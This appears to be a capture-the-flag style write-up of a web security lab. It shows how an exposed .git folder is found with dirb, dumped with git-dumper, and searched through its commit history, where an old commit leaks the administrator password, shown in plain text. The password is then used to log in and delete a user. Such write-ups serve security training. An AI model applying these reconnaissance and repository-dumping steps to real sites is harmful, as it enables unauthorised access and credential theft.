## Information disclosure in version control history

This lab discloses sensitive information via its version control history. To solve the lab, obtain the password for the administrator user then log in and delete the user carlos.

## Notes

- /admin
- /login
- /.git

## Resume

1. Fuzz the url to find the `.git`
2. Dump the git folder
3. Find the password in old git commit
4. Log on admin portal
5. Delete Carlos account


## Solve 

Fuzz the url to find the `.git` using **dirb** :

```bash
dirb https://0a8100cb037cf6ea80d2daf100b2000a.web-security-academy.net/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Apr 19 14:51:13 2026
URL_BASE: https://0a8100cb037cf6ea80d2daf100b2000a.web-security-academy.net/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: https://0a8100cb037cf6ea80d2daf100b2000a.web-security-academy.net/ ----
+ https://0a8100cb037cf6ea80d2daf100b2000a.web-security-academy.net/.git/HEAD (CODE:200|SIZE:23)
```

Use [https://github.com/arthaud/git-dumper](git-dumper) to dump the entiere git folder : 

`python3 git_dumper.py <lab url> <dump folder>`
`python3 git_dumper.py https://0a8100cb037cf6ea80d2daf100b2000a.web-security-academy.net/.git lab`

```bash
 ls -lsa                                                                                           
total 20
4 drwxrwxr-x 3 kali kali 4096 19 avril 14:53 .
4 drwxrwxr-x 5 kali kali 4096 19 avril 14:48 ..
4 -rw-rw-r-- 1 kali kali   37 19 avril 14:48 admin.conf
4 -rw-rw-r-- 1 kali kali   88 19 avril 14:48 admin_panel.php
4 drwxrwxr-x 7 kali kali 4096 19 avril 14:48 .git
```

Use git command to check logs and find old commit :

```bash
git log
commit 208adbd379a3de270b3ca339fd4fa0fc1ffe3554 (HEAD -> master)
Author: Carlos Montoya <carlos@carlos-montoya.net>
Date:   Tue Jun 23 14:05:07 2020 +0000

    Remove admin password from config

commit ae6f83a0486e978cdc16c5208f197d5e1f127efe
Author: Carlos Montoya <carlos@carlos-montoya.net>
Date:   Mon Jun 22 16:23:42 2020 +0000

    Add skeleton admin panel
```

```bash
 git show 208adbd379a3de270b3ca339fd4fa0fc1ffe3554  
commit 208adbd379a3de270b3ca339fd4fa0fc1ffe3554 (HEAD -> master)
Author: Carlos Montoya <carlos@carlos-montoya.net>
Date:   Tue Jun 23 14:05:07 2020 +0000

    Remove admin password from config

diff --git a/admin.conf b/admin.conf
index 9daf79e..21d23f1 100644
--- a/admin.conf
+++ b/admin.conf
@@ -1 +1 @@
-ADMIN_PASSWORD=zyt9tlg8vm39hsyy0lbw
+ADMIN_PASSWORD=env('ADMIN_PASSWORD')
```

Login on administrator dashboard with : administrator:zyt9tlg8vm39hsyy0lbw and delete Carlos account